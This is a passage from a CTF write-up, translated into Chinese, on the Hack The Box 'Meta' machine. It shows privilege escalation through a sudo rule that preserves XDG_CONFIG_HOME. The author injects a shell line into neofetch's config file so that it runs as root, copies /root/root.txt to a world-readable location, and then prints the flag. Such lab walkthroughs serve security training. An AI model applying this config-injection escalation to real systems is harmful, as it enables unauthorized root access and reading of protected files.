lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我不太清楚，但是文档中提到了一个配置文件。找文件的时候我找到了一些:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="5c7c" class="nm kg iq ni b gy nn no l np nq">thomas@meta:~$ find / -name neofetch 2&gt;/dev/null<br/>/usr/bin/neofetch<br/>/usr/share/doc/neofetch<br/>/home/thomas/.config/neofetch</span></pre><p id="aafd" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">thomas主文件夹中有一个conf文件:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="f0a3" class="nm kg iq ni b gy nn no l np nq">thomas@meta:~$ more .config/neofetch/config.conf<br/># See this wiki page for more info:<br/># https://github.com/dylanaraps/neofetch/wiki/Customizing-Info<br/>print_info() {<br/>    info title<br/>    info underline<br/>    info "OS" distro<br/>    info "Host" model<br/>    info "Kernel" kernel<br/>    info "Uptime" uptime<br/>    info "Packages" packages<br/>    info "Shell" shell<br/>    info "Resolution" resolution<br/>    info "DE" de<br/>    info "WM" wm<br/>    info "WM Theme" wm_theme<br/>    info "Theme" theme<br/>    info "Icons" icons<br/>    info "Terminal" term<br/>    info "Terminal Font" term_font<br/>&lt;SNIP&gt;</span></pre><p id="36e6" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">文件真的很大，有上百个设置。文件上还写着:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="e8f8" class="nm kg iq ni b gy nn no l np nq">Neofetch will by default create a config file at $HOME/.config/neofetch/config.conf on first run. This file contains options to control all aspects of the output. The config file allows you to keep your customization between versions and allows you to easily share your customization with other people.</span></pre><p id="da9b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所以这个配置文件是为thomas准备的，也会有一个为root准备的，因为当我们用sudo运行neofetch时，我们是以root身份运行它的。当我们以root用户身份运行neofetch时，我们需要想办法让它使用thomas home文件夹中的配置文件。</p><h1 id="65bb" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">XDG _配置_主页</h1><p id="c7ed" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">回到sudo权利:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="29f4" class="nm kg iq ni b gy nn no l np nq">Matching Defaults entries for thomas on meta:<br/>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME</span></pre><p id="d4cd" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">什么是XDG配置主页？我发现这个上面写着:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="d2be" class="nm kg iq ni b gy nn no l np nq">$XDG_CONFIG_HOME defines the base directory relative to which user-specific configuration files should be stored. If $XDG_CONFIG_HOME is either not set or empty, a default equal to $HOME/.config should be used.</span></pre><p id="de1a" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">因此，我们可以强制neofetch在特定的文件夹中查找配置文件。我们可以简单地这样做:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="4df3" class="nm kg iq ni b gy nn no l np nq">export XDG_CONFIG_HOME="$HOME/.config"<br/><br/>thomas@meta:~$ echo $XDG_CONFIG_HOME<br/>/home/thomas/.config</span></pre><h1 id="4668" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">根标志</h1><p id="c0ff" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">现在，当我们以root用户身份运行neofetch时，它使用一个我们控制的配置文件。neofetch是一个bash脚本，我们可以向它添加我们自己的命令。我只是在开头添加了一行，将root.txt文件复制到/dev/shm:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="d18e" class="nm kg iq ni b gy nn no l np nq">thomas@meta:~$ more .config/neofetch/config.conf<br/>cp /root/root.txt /dev/shm/root.txt &amp;&amp; chmod 777 /dev/shm/root.txt<br/># See this wiki page for more info:<br/># https://github.com/dylanaraps/neofetch/wiki/Customizing-Info<br/>print_info() {<br/>    info title<br/>&lt;SNIP&gt;</span></pre><p id="cfa1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">以root用户身份运行neofetch:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="9cf3" class="nm kg iq ni b gy nn no l np nq">thomas@meta:~$ sudo -u root /usr/bin/neofetch \"\"<br/>       _,met$$$$$gg.          root@meta <br/>    ,g$$$$$$$$$$$$$$$P.       --------- <br/>  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 <br/> ,$$P'              `$$$.     Host: VMware Virtual Platform None <br/>',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 <br/>`d$$'     ,$P"'   .    $$$    Uptime: 3 hours, 41 mins <br/> $$P      d$'     ,    $$P    Packages: 495 (dpkg) <br/> $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 <br/> $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz <br/> Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter <br/> `$$b      "-.__              Memory: 115MiB / 1994MiB <br/>  `Y$$<br/>   `Y$$.<br/>     `$$b.<br/>       `Y$$b.<br/>          `"Y$b._<br/>              `"""</span></pre><p id="e7dd" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">检查根标志是否存在:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="0289" class="nm kg iq ni b gy nn no l np nq">thomas@meta:~$ ls -lsa /dev/shm<br/>total 16<br/>0 drwxrwxrwt  2 root     root      120 Jan 23 16:43 .<br/>0 drwxr-xr-x 16 root     root     3080 Jan 23 13:25 ..<br/>4 -rw-r--r--  1 thomas   thomas     54 Jan 23 13:38 0wned<br/>4 -rw-r--r--  1 thomas   thomas   2590 Jan 23 13:31 key<br/>4 -rw-r--r--  1 www-data www-data  407 Jan 23 13:35 poc.svg<br/>4 -rwxrwxrwx  1 root     root       33 Jan 23 16:53 root.txt</span></pre><p id="3d27" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">抓住旗子完成盒子:</p><pre class="ky kz la lb gt nh ni nj nk aw nl bi"><span id="46ac" class="nm kg iq ni b gy nn no l np nq">thomas@meta:~$ cat /dev/shm/root.txt<br/>d5dd929ed86323234568c01461e44caf</span></pre><p id="ce99" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">完成了。下次见。</p></div><div class="ab cl ob oc hu od" role="separator"><span class="oe bw bk of og oh"/><span class="oe bw bk of og oh"/><span class="oe bw bk of og"/></div><div class="ij ik il im in"><p id="08b4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="e33e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">推特—<a class="ae nw" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nw" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="a0e4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="oi">原载于2022年6月14日</em><a class="ae nw" href="https://pencer.io/ctf/ctf-htb-meta/" rel="noopener ugc nofollow" target="_blank"><em class="oi">https://pencer . io</em></a><em class="oi">。</em></p></div></div>    
</body>
</html>